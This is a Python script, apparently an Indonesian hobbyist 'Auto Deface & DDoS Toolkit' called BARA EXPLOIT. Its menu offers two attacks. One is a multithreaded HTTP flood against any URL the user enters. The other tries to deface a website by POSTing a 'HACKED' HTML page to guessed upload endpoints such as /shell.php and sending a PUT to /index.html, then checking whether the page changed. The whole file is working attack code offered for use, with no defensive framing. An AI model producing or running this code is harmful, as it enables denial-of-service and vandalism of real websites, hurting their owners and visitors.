import os
import sys
import time
import random
import threading
import requests
import urllib3
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""{Fore.RED}
    ██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    ██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
    ██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
    ██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Fore.CYAN}
                          ╔══════════════════════════════════════╗
                          ║      BARA EXPLOIT v2.0               ║
                          ║   Auto Deface & DDoS Toolkit         ║
                          ║          By: BARA                    ║
                          ╚══════════════════════════════════════╝
{Fore.RESET}""")

def menu():
    print(f"{Fore.YELLOW}[1]{Fore.WHITE} DDoS Attack")
    print(f"{Fore.YELLOW}[2]{Fore.WHITE} Hack / Deface Website")
    print(f"{Fore.YELLOW}[99]{Fore.WHITE} Keluar")
    print()
    pilih = input(f"{Fore.CYAN}BARA@EXPLOIT:~# {Fore.WHITE}").strip()

    if pilih == "1":
        ddos_menu()
    elif pilih == "2":
        hack_menu()
    elif pilih == "99":
        print(f"{Fore.RED}[!] Keluar...{Fore.RESET}")
        sys.exit()
    else:
        print(f"{Fore.RED}[!] Pilihan salah!{Fore.RESET}")
        time.sleep(1)
        banner()
        menu()

# ============ DDOS ============
stats = {"sent": 0, "success": 0, "fail": 0}
running = True

def worker(url):
    global running
    while running:
        try:
            r = requests.get(url, timeout=3, verify=False, headers={
                "User-Agent": f"Mozilla/5.0 (BARA-{random.randint(1,9999)})",
                "Cache-Control": "no-cache"
            })
            stats["sent"] += 1
            if r.status_code < 400:
                stats["success"] += 1
            else:
                stats["fail"] += 1
        except:
            stats["sent"] += 1
            stats["fail"] += 1
        time.sleep(random.uniform(0.1, 1.0))

def stat_loop(url):
    global running
    start = time.time()
    while running:
        time.sleep(1)
        elapsed = int(time.time() - start)
        print(f"\r{Fore.GREEN}[+] {url} {Fore.GREEN}| Sent: {Fore.YELLOW}{stats['sent']} {Fore.GREEN}| OK: {Fore.CYAN}{stats['success']} {Fore.GREEN}| Fail: {Fore.RED}{stats['fail']} {Fore.GREEN}| Time: {Fore.WHITE}{elapsed}s   ", end="")

def ddos_menu():
    clear()
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════╗
    ║          DDoS ATTACK MODE            ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")
    url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
    if not url.startswith("http"):
        print(f"{Fore.RED}[!] URL harus pakai http:// atau https://{Fore.RESET}")
        time.sleep(2)
        ddos_menu()
        return

    try:
        workers = int(input(f"{Fore.CYAN}Worker (default 200): {Fore.WHITE}") or "200")
    except:
        workers = 200

    try:
        duration = int(input(f"{Fore.CYAN}Durasi detik (default 60): {Fore.WHITE}") or "60")
    except:
        duration = 60

    global running, stats
    running = True
    stats = {"sent": 0, "success": 0, "fail": 0}

    print(f"\n{Fore.YELLOW}[*] Attack ke {url}...{Fore.RESET}\n")

    for _ in range(workers):
        threading.Thread(target=worker, args=(url,), daemon=True).start()

    threading.Thread(target=stat_loop, args=(url,), daemon=True).start()

    time.sleep(duration)
    running = False
    time.sleep(1)
    print(f"\n\n{Fore.GREEN}[✓] Selesai! Sent: {stats['sent']} | OK: {stats['success']} | Fail: {stats['fail']}{Fore.RESET}")
    input(f"\n{Fore.CYAN}ENTER balik ke menu...{Fore.RESET}")
    banner()
    menu()

# ============ HACK / DEFACE ============
def build_deface(pesan):
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>HACKED BY BARA</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{
    background:#000; color:#0f0;
    font-family:'Courier New',monospace;
    min-height:100vh; display:flex;
    justify-content:center; align-items:center;
    overflow:hidden;
  }}
  #matrix {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; }}
  .content {{ position:relative; z-index:2; text-align:center; padding:40px; }}
  h1 {{
    font-size:80px; color:#ff0000;
    text-shadow:0 0 20px #ff0000, 0 0 60px #ff0000;
    animation:glitch 0.3s infinite;
    letter-spacing:8px; font-weight:900;
  }}
  @keyframes glitch {{
    0% {{ transform:translate(0); }}
    20% {{ transform:translate(-4px,4px); }}
    40% {{ transform:translate(-4px,-4px); }}
    60% {{ transform:translate(4px,4px); }}
    80% {{ transform:translate(4px,-4px); }}
    100% {{ transform:translate(0); }}
  }}
  .msg {{
    font-size:28px; color:#0f0;
    margin-top:30px; letter-spacing:4px;
    text-shadow:0 0 15px #0f0; font-weight:bold;
  }}
  .skull {{ font-size:150px; margin-bottom:20px; animation:pulse 1s infinite; }}
  @keyframes pulse {{
    0%,100% {{ opacity:1; transform:scale(1); }}
    50% {{ opacity:0.5; transform:scale(1.15); }}
  }}
  .footer {{ margin-top:50px; color:#666; font-size:14px; letter-spacing:3px; }}
  .warning {{
    color:#ff0000; font-size:22px;
    margin-top:25px; animation:blink 0.5s infinite;
    letter-spacing:4px;
  }}
  @keyframes blink {{ 0%,100% {{ opacity:1; }} 50% {{ opacity:0; }} }}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="content">
  <div class="skull">💀</div>
  <h1>HACKED</h1>
  <div class="msg">{pesan}</div>
  <div class="warning">⚠ SYSTEM COMPROMISED ⚠</div>
  <div class="footer">BARA EXPLOIT v2.0 — {time.strftime('%Y-%m-%d %H:%M:%S')}</div>
</div>
<script>
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
function draw() {{
  ctx.fillStyle = 'rgba(0,0,0,0.05)';
  ctx.fillRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle = '#0f0';
  ctx.font = fontSize + 'px monospace';
  for (let i = 0; i < drops.length; i++) {{
    const text = chars[Math.floor(Math.random()*chars.length)];
    ctx.fillText(text, i*fontSize, drops[i]*fontSize);
    if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }}
}}
setInterval(draw, 33);
</script>
</body>
</html>"""

def try_deface(target_url, payload):
    endpoints = [
        "/upload", "/api/upload", "/upload.php", "/file/upload",
        "/uploadfile", "/shell.php", "/admin/upload.php",
        "/upload.html", "/admin/upload", "/api/v1/upload"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (BARA-DEFACE)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payloads = [
        {"file": payload}, {"content": payload},
        {"data": payload}, {"html": payload}, {"page": payload},
    ]
    results = []
    base = target_url.rstrip("/")

    for ep in endpoints:
        for p in payloads:
            try:
                r = requests.post(base + ep, data=p, headers=headers, timeout=5, verify=False)
                if r.status_code in [200, 201, 302]:
                    results.append((ep, r.status_code))
            except:
                pass
    return results

def try_put(target_url, payload):
    try:
        r = requests.put(target_url.rstrip("/") + "/index.html",
                         data=payload, headers={"User-Agent": "BARA"}, timeout=5, verify=False)
        return r.status_code
    except:
        return None

def hack_menu():
    clear()
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════╗
    ║      HACK / DEFACE WEBSITE MODE      ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")
    url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
    if not url.startswith("http"):
        print(f"{Fore.RED}[!] URL harus pakai http:// atau https://{Fore.RESET}")
        time.sleep(2)
        hack_menu()
        return

    pesan = input(f"{Fore.CYAN}Text deface: {Fore.WHITE}").strip()
    if not pesan:
        pesan = "WEBSITE HACKED BY BARA"

    print(f"\n{Fore.RED}[*] Scanning target: {url}{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.YELLOW}[*] Enumerating endpoints...{Fore.RESET}")
    time.sleep(1)

    payload = build_deface(pesan)

    print(f"{Fore.YELLOW}[*] Injecting payload...{Fore.RESET}")
    results = try_deface(url, payload)

    print(f"{Fore.YELLOW}[*] Trying PUT method...{Fore.RESET}")
    put_status = try_put(url, payload)

    print(f"\n{Fore.CYAN}══════════ HASIL ══════════{Fore.RESET}")
    if results:
        for ep, code in results:
            print(f"{Fore.GREEN}[+] {ep} → HTTP {code}{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Tidak ada endpoint vulnerable.{Fore.RESET}")
    if put_status:
        print(f"{Fore.YELLOW}[?] PUT /index.html → HTTP {put_status}{Fore.RESET}")

    print(f"\n{Fore.YELLOW}[*] Verifying...{Fore.RESET}")
    time.sleep(2)
    try:
        r = requests.get(url, timeout=5, verify=False)
        if pesan.lower() in r.text.lower() or "HACKED" in r.text:
            print(f"{Fore.GREEN}[✓] TARGET BERHASIL DI-DEFACE!{Fore.RESET}")
        else:
            print(f"{Fore.RED}[✗] Target belum berubah.{Fore.RESET}")
            print(f"{Fore.YELLOW}[!] Server ga vulnerable ke metode ini.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal verify: {e}{Fore.RESET}")

    print(f"\n{Fore.RED}")
    for i in range(3):
        print("█" * 60)
        time.sleep(0.15)
    print(f"{Fore.RESET}")

    input(f"\n{Fore.CYAN}ENTER balik ke menu...{Fore.RESET}")
    banner()
    menu()

if __name__ == "__main__":
    try:
        banner()
        menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dihentikan.{Fore.RESET}")
        sys.exit()
